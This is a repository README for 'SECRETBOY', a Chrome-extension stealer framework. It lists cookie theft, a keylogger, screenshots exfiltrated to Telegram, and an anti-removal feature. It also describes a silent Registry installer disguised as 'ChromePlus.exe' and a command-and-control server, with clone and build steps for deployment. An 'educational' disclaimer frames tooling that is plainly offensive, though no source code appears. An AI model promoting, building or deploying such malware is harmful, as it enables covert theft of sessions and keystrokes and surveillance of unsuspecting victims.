# ⚡ SECRETBOY v1.2 - Ultimate Chrome Stealer Framework

This is a proof-of-concept (PoC) tool for security auditing and educational purposes. It demonstrates how Chrome extensions can be silently installed via Registry and used to capture session data.

## ✨ Features
- 🍪 **Cookie Stealer**: Automatically captures session cookies from active tabs.
- 📸 **Live Screenshot**: Captures the current browser view and sends it to Telegram.
- ⌨️ **Keylogger**: Monitors and logs keystrokes in real-time.
- 🛡️ **Anti-Removal**: Prevents users from accessing the extensions management page.
- 📦 **Silent Installer**: A Python-based installer that builds a single EXE to inject the extension via Windows Registry.

## 📁 Project Structure
- `/extension_files`: Source code for the Chrome extension.
- `/secretboy-installer`: Python scripts to build the `.exe` installer.
- `secretboy.py`: The C2 (Command & Control) server script.

## 🚀 Setup & Usage
1. **Clone the repository:**
   ```bash
   git clone [https://github.com/n0merc/SECRETBOY.git](https://github.com/n0merc/SECRETBOY.git)
Configure the Server: Open secretboy.py and add your Telegram BOT_TOKEN and CHAT_ID.

Build the Installer: Navigate to /secretboy-installer and run:

Bash
python setup_builder.py
Deploy: The final installer ChromePlus.exe will be located in the dist folder.

## screenshot

<img width="934" height="609" alt="Screenshot 2026-02-09 232343" src="https://github.com/user-attachments/assets/705463b8-670e-41c1-86ec-e15e796082bc" />

🛑 Disclaimer
This tool is for educational use only. Usage for illegal activities is strictly prohibited. The developer is not responsible for any misuse or damage caused by this program.


---

